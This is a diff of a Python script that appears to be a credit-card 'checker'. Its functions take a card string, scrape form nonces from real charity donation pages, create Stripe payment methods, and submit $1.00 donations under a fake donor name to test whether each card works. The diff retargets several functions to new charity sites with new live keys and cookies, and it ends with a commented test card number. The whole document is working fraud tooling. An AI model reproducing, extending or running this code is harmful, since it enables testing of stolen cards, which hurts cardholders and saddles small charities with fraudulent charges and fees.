             'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
             'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
             'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F',
+            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fauseducationscholarshipfund.com%2FFundraising-campaign%2Fempowering-women-scholarship%2F',
+            '__stripe_sid': 'de2410b7-a6e8-4848-84f9-152c87deb38ead8d6c',
         }
         
         headers = {
-            'authority': 'gods-dna.com',
+            'authority': 'auseducationscholarshipfund.com',
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=HVibdSc+HF3H/QFkrPiTYiXR; __stripe_mid=28300acb-8ef7-4687-b261-61418c999a5bad3f06; charitable_session=32f77a502efa2eb8a91d97ca3835b81c||86400||82800; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_sid=e45f54e9-5563-4c55-b832-2b650928c4a333fad8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F',
-            'origin': 'https://gods-dna.com',
-            'referer': 'https://gods-dna.com/campaigns/save-water-initiative/donate/',
+            # 'cookie': '__stripe_mid=2a52e21d-40a7-4845-82b6-642ff1744f867fc01b; wpconsent_preferences={"essential":true,"statistics":true,"marketing":true}; charitable_session=bbef5a0d949eb28eb414c9bfbd5b8421||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-09%2011%3A10%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fauseducationscholarshipfund.com%2FFundraising-campaign%2Fempowering-women-scholarship%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-09%2011%3A10%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fauseducationscholarshipfund.com%2FFundraising-campaign%2Fempowering-women-scholarship%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fauseducationscholarshipfund.com%2FFundraising-campaign%2Fempowering-women-scholarship%2F; __stripe_sid=de2410b7-a6e8-4848-84f9-152c87deb38ead8d6c',
+            'origin': 'https://auseducationscholarshipfund.com',
+            'referer': 'https://auseducationscholarshipfund.com/Fundraising-campaign/empowering-women-scholarship/',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -2674,11 +2662,10 @@ def go13(cc_input: str) -> str:
             'charitable_form_id': f'{form_id}',
             f'{form_id}': '',
             '_charitable_donation_nonce': f'{donation_nonce}',
-            '_wp_http_referer': '/campaigns/save-water-initiative/donate/',
+            '_wp_http_referer': '/Fundraising-campaign/empowering-women-scholarship/',
             'campaign_id': f'{campaign_id}',
-            'description': 'Sierra Leone, West Africa Project',
+            'description': 'Support Our Empowering Women Scholarship Fund: Empowering Women Through Education',
             'ID': f'{donation_id}',
-            'gateway': 'stripe',
             'donation_amount': 'custom',
             'custom_donation_amount': '1.00',
             'first_name': 'Gen',
@@ -2689,14 +2676,21 @@ def go13(cc_input: str) -> str:
             'city': '',
             'state': '',
             'postcode': '',
-            'country': 'US',
+            'country': 'AU',
             'phone': '',
+            'gateway': 'stripe',
             'stripe_payment_method': f'{pm}',
+            'cover_fees': '1',
             'action': 'make_donation',
             'form_action': 'make_donation',
         }
         
-        response = requests.post('https://gods-dna.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        response = requests.post(
+            'https://auseducationscholarshipfund.com/wp-admin/admin-ajax.php',
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -2733,7 +2727,7 @@ def go13(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT',
+    'key': 'pk_live_51N0c3wFu9PrY1RQZncVecs6WwgAUS2zFFExpZnB7jnbuQrUQp08roqVZXgEnOidrsiqwhnm1FvPl3jIxYsiSWrw100B2nmJyOO',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2794,7 +2788,7 @@ def go14(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://hopemtnva.com/', headers=headers)
+        response = requests.get('https://beaconvision.org/online-donations/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2821,7 +2815,7 @@ def go14(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fhopemtnva.com&time_on_page=50747&client_attribution_metadata[client_session_id]=4824e16e-e7f2-4bbb-8742-616ef52b0667&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PBId7FhEK3phoWoX9dH9x8HZcCxtloZxTcGEvn5JSF3SfPSNLFMob2bPNRUbCN5bRk9Hb1NLf0Xcj5hXY9NICMc00JzgoE1TS'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=27+Allen+St&billing_details[address][postal_code]=10002&billing_details[address][state]=New+York&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F384cf3d9a5%3B+stripe-js-v3%2F384cf3d9a5%3B+card-element&referrer=https%3A%2F%2Fbeaconvision.org&time_on_page=40005&client_attribution_metadata[client_session_id]=5f24b8d1-643f-444b-9e3e-381b1915b120&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_514nVw8IIu8yDMXn3PeT4dDKS8DbdKjZoFAfJrBDp8re05cKKnAZVpawJHfioPmy8djmXzlnQYgHs005B8efv4sfx00bK3xoO5q'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -2833,19 +2827,21 @@ def go14(cc_input: str) -> str:
                 
         #3
         cookies = {
-            '__stripe_mid': 'ec5e888e-3b27-42cb-83a9-ae9b277d8b28bdcf49',
-            '__stripe_sid': 'b897c3b8-7bc7-492a-adb3-a853040dc919cfd06b',
-            'charitable_session': '251a6eca554eb6d0bd1bfc269bc8db2d||86400||82800',
+            '_ga': 'GA1.1.1004686897.1767957550',
+            'charitable_session': '5b1b023d262cf8e1bf0c715e80195bf1||86400||82800',
+            '__stripe_mid': '23b7ae8f-1c0c-421a-9c4c-e8eb7cea27922a11e7',
+            '__stripe_sid': 'd39699f3-c5c3-4cf0-a68d-db7c074a81cca915c2',
+            '_ga_SE5CLDPFGS': 'GS2.1.s1767957549$o1$g1$t1767957694$j58$l0$h0',
         }
         
         headers = {
-            'authority': 'hopemtnva.com',
+            'authority': 'beaconvision.org',
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '__stripe_mid=ec5e888e-3b27-42cb-83a9-ae9b277d8b28bdcf49; __stripe_sid=b897c3b8-7bc7-492a-adb3-a853040dc919cfd06b; charitable_session=251a6eca554eb6d0bd1bfc269bc8db2d||86400||82800',
-            'origin': 'https://hopemtnva.com',
-            'referer': 'https://hopemtnva.com/',
+            # 'cookie': '_ga=GA1.1.1004686897.1767957550; charitable_session=5b1b023d262cf8e1bf0c715e80195bf1||86400||82800; __stripe_mid=23b7ae8f-1c0c-421a-9c4c-e8eb7cea27922a11e7; __stripe_sid=d39699f3-c5c3-4cf0-a68d-db7c074a81cca915c2; _ga_SE5CLDPFGS=GS2.1.s1767957549$o1$g1$t1767957694$j58$l0$h0',
+            'origin': 'https://beaconvision.org',
+            'referer': 'https://beaconvision.org/online-donations/',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -2860,22 +2856,31 @@ def go14(cc_input: str) -> str:
             'charitable_form_id': f'{form_id}',
             f'{form_id}': '',
             '_charitable_donation_nonce': f'{donation_nonce}',
-            '_wp_http_referer': '/',
+            '_wp_http_referer': '/online-donations/',
             'campaign_id': f'{campaign_id}',
-            'description': 'Hope Mountain',
+            'description': 'Support Our Cause',
             'ID': f'{donation_id}',
             'gateway': 'stripe',
             'donation_amount': 'custom',
             'custom_donation_amount': '1.00',
+            'title': 'Mr',
             'first_name': 'Gen',
             'last_name': 'Paypal',
             'email': email,
+            'address': '27 Allen St',
+            'address_2': '',
+            'address_3': '',
+            'city': 'New York',
+            'state': 'New York',
+            'postcode': '10002',
+            'country': 'US',
+            'phone': '',
             'stripe_payment_method': f'{pm}',
             'action': 'make_donation',
             'form_action': 'make_donation',
         }
         
-        response = requests.post('https://hopemtnva.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        response = requests.post('https://beaconvision.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -2912,7 +2917,7 @@ def go14(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51PBId7FhEK3phoWoX9dH9x8HZcCxtloZxTcGEvn5JSF3SfPSNLFMob2bPNRUbCN5bRk9Hb1NLf0Xcj5hXY9NICMc00JzgoE1TS',
+    'key': 'pk_live_514nVw8IIu8yDMXn3PeT4dDKS8DbdKjZoFAfJrBDp8re05cKKnAZVpawJHfioPmy8djmXzlnQYgHs005B8efv4sfx00bK3xoO5q',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -3157,7 +3162,7 @@ def go16(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://letussoar.com/campaigns/education-for-everyone', headers=headers)
+        response = requests.get('https://hdsportsfoundation.org/campaigns/donate/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -3184,7 +3189,7 @@ def go16(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fletussoar.com&time_on_page=103640&client_attribution_metadata[client_session_id]=119039fb-dcd6-4c5a-8859-d4c5a0e476d4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Sb1OURfyggrecD8Y2FDk7kLjEeRAKFOjOVc5EGLXRZls2kOsp2ZjwwQtqmeC1064HhkbLAI1lobneWyiaW4TsFI00p37S47fA'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F384cf3d9a5%3B+stripe-js-v3%2F384cf3d9a5%3B+card-element&referrer=https%3A%2F%2Fhdsportsfoundation.org&time_on_page=33416&client_attribution_metadata[client_session_id]=93cf4da6-c844-46b8-8d2c-35b62e9d2e55&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51NPpJdKIUe0GoHOrOLxrVcrMF6MA6k1XBhV1ZP1iTuHaF5oyatiiRzfipcqikkiJdPUcXpUVCvSlzvzOHDRdWHGX00JclvNuFr'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -3196,30 +3201,26 @@ def go16(cc_input: str) -> str:
                 
         #3
         cookies = {
-            'charitable_session': 'f73b8431f216636831c980e90f95eb77||86400||82800',
+            'charitable_session': '9b54bc7d1668f66e0411ef70b7413e23||86400||82800',
             'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_first_add': 'fd%3D2026-01-04%2021%3A03%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current_add': 'fd%3D2026-01-09%2011%3A37%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_first_add': 'fd%3D2026-01-09%2011%3A37%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
             'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
             'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
             'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-            '_tccl_visitor': '9d09cbe1-7251-4aef-9af8-5cf212b12e4d',
-            '_tccl_visit': '9d09cbe1-7251-4aef-9af8-5cf212b12e4d',
-            '__cf_bm': 'Oy79NXKeY9tNRm8QgGNtbl8mFC.BzfuXrfCzWAe33Fs-1767560630-1.0.1.1-LljUOOGROGn6YiaxZjuz1.05orS6I4WLevxXWYwUB_G0wAD4LQW54H0WUC_ZavsJhYchP45ZknpI8zoc4g7rDy0CIdobe1Fx9_mms9cXDeY',
-            'sbjs_current_add': 'fd%3D2026-01-04%2021%3A03%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F',
-            '_scc_session': 'pc=2&C_TOUCH=2026-01-04T21:03:50.749Z',
-            '__stripe_mid': '989dd258-9650-4fec-8db8-43e44d7d3cf56aa64c',
-            '__stripe_sid': 'ae601e9b-42e5-45f4-ae7a-72d095887dd501378e',
+            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
+            '__stripe_mid': 'e02d798f-b452-4497-b88e-525c3029f8f65e6021',
+            '__stripe_sid': 'd4ed6cf8-3070-4de4-8ecb-ad2a3412f21c2cfd73',
         }
         
         headers = {
-            'authority': 'letussoar.com',
+            'authority': 'hdsportsfoundation.org',
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': 'charitable_session=f73b8431f216636831c980e90f95eb77||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2026-01-04%2021%3A03%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _tccl_visitor=9d09cbe1-7251-4aef-9af8-5cf212b12e4d; _tccl_visit=9d09cbe1-7251-4aef-9af8-5cf212b12e4d; __cf_bm=Oy79NXKeY9tNRm8QgGNtbl8mFC.BzfuXrfCzWAe33Fs-1767560630-1.0.1.1-LljUOOGROGn6YiaxZjuz1.05orS6I4WLevxXWYwUB_G0wAD4LQW54H0WUC_ZavsJhYchP45ZknpI8zoc4g7rDy0CIdobe1Fx9_mms9cXDeY; sbjs_current_add=fd%3D2026-01-04%2021%3A03%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fletussoar.com%2Fcampaigns%2Feducation-for-everyone%2F; _scc_session=pc=2&C_TOUCH=2026-01-04T21:03:50.749Z; __stripe_mid=989dd258-9650-4fec-8db8-43e44d7d3cf56aa64c; __stripe_sid=ae601e9b-42e5-45f4-ae7a-72d095887dd501378e',
-            'origin': 'https://letussoar.com',
-            'referer': 'https://letussoar.com/campaigns/education-for-everyone/',
+            # 'cookie': 'charitable_session=9b54bc7d1668f66e0411ef70b7413e23||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-09%2011%3A37%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-09%2011%3A37%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F; __stripe_mid=e02d798f-b452-4497-b88e-525c3029f8f65e6021; __stripe_sid=d4ed6cf8-3070-4de4-8ecb-ad2a3412f21c2cfd73',
+            'origin': 'https://hdsportsfoundation.org',
+            'referer': 'https://hdsportsfoundation.org/campaigns/donate/',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -3234,31 +3235,22 @@ def go16(cc_input: str) -> str:
             'charitable_form_id': f'{form_id}',
             f'{form_id}': '',
             '_charitable_donation_nonce': f'{donation_nonce}',
-            '_wp_http_referer': '/campaigns/education-for-everyone/',
+            '_wp_http_referer': '/campaigns/donate/',
             'campaign_id': f'{campaign_id}',
-            'description': 'Education For Everyone Initiative',
+            'description': 'Donate',
             'ID': f'{donation_id}',
+            'gateway': 'stripe',
             'donation_amount': 'custom',
             'custom_donation_amount': '1.00',
             'first_name': 'Gen',
             'last_name': 'Paypal',
             'email': email,
-            'address': '',
-            'address_2': '',
-            'city': '',
-            'state': '',
-            'postcode': '',
-            'country': 'US',
-            'phone': '',
-            'gateway': 'stripe',
-            'square_token': 'cnon:CA4SEGvGGXD7zjt8mOr9wu0lChEYASgC',
-            'square_verification_token': '',
             'stripe_payment_method': f'{pm}',
             'action': 'make_donation',
             'form_action': 'make_donation',
         }
         
-        response = requests.post('https://letussoar.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        response = requests.post('https://hdsportsfoundation.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -3295,7 +3287,7 @@ def go16(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51Sb1OURfyggrecD8Y2FDk7kLjEeRAKFOjOVc5EGLXRZls2kOsp2ZjwwQtqmeC1064HhkbLAI1lobneWyiaW4TsFI00p37S47fA',
+    'key': 'pk_live_51NPpJdKIUe0GoHOrOLxrVcrMF6MA6k1XBhV1ZP1iTuHaF5oyatiiRzfipcqikkiJdPUcXpUVCvSlzvzOHDRdWHGX00JclvNuFr',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -3713,4 +3705,5 @@ def go19(cc_input: str) -> str:
 #================================
         
 #test_card = "4342564062186261|12|27|925"
-#print(go0(test_card))
+#print(go16(test_card))
+#errors,16,18
